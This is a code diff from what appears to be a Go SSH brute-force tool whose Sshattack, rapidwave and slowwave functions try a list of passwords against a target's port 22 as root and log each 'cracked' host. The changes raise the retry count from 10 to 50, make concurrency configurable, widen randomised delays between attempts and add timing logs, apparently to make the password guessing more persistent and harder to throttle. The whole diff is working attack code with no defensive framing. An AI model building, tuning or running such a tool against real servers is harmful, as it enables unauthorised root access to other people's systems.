@@ -34,11 +34,13 @@ func Sshattack(ip string, passwd []string, rate int, sem chan struct{}) {
 
 	cancel := make(chan struct{})
 	cracked := make(chan string)
-	sem2 := make(chan struct{}, 100)
+	sem2 := make(chan struct{}, rate)
 	slowchannel := make(chan string)
 	ifslow := true
 
-	log.Printf("starting rapidwave on %s...\n", ip)
+	start := time.Now()
+	log.Printf("%s:starting rapidwave...\n", ip)
+
 term:
 	for _, pass := range passwd {
 		select {
@@ -59,7 +61,7 @@ term:
 
 	wg2.Wait()
 
-	log.Printf("\033[1;36mrapidwave finished\033[0m\n")
+	log.Printf("\033[1;36m%s: rapidwave finished (%s)\033[0m\n", ip, time.Since(start))
 
 	<-sem
 
@@ -127,11 +129,12 @@ term:
 
 	time.Sleep(time.Second * 1)
 
+	start = time.Now()
 	log.Printf("\033[1;34mstarting slowwave on %s...\033[0m", ip)
 
 	slowwave(ip, slowqueue)
 
-	log.Print("\033[1;36mslowwave finished\n\033[0m")
+	log.Printf("\033[1;36mslowwave finished on %s(%s)\n\033[0m", ip, time.Since(start))
 }
 func rapidwave(ip, pass string, cracked chan<- string, sem <-chan struct{}, cancel chan<- struct{}, wave2 chan<- string, wg *sync.WaitGroup) {
 	/*
@@ -167,10 +170,11 @@ func rapidwave(ip, pass string, cracked chan<- string, sem <-chan struct{}, canc
 
 	fail := true
 
-	for i := 0; i < 10; i++ {
+	for i := 0; i < 50; i++ {
 		source := rand.NewSource(time.Now().UnixNano())
 		rng := rand.New(source)
 		client, err = ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config)
+
 		if err == nil {
 			log.Printf("\x1b[32m%s has been cracked (root:%s)\x1b[0m\n", ip, pass)
 			fail = false
@@ -182,7 +186,7 @@ func rapidwave(ip, pass string, cracked chan<- string, sem <-chan struct{}, canc
 			fail = false
 			break
 		}
-		randomMilli := rng.Intn(200) + 100
+		randomMilli := rng.Intn(500) + 100
 
 		time.Sleep(time.Millisecond * time.Duration(randomMilli))
 	}
@@ -209,12 +213,9 @@ func rapidwave(ip, pass string, cracked chan<- string, sem <-chan struct{}, canc
 	}()
 
 	if err == nil {
-		log.Println("cancelling")
 		wg.Done()
 		cancel <- struct{}{}
-		log.Println("sending value to cracked")
 		cracked <- pass
-		log.Println("sent")
 	}
 }
 
@@ -254,6 +255,6 @@ func attemptslowwave(ip, pass string) {
 	}
 
 	if failed {
-		fmt.Printf("\033[1;33mWARNNG!!! failed to authenticate %s after multiple waves\033[0m\n", pass)
+		log.Printf("\033[1;33mWARNNG!!! failed to authenticate %s after multiple waves\033[0m\n", pass)
 	}
 }
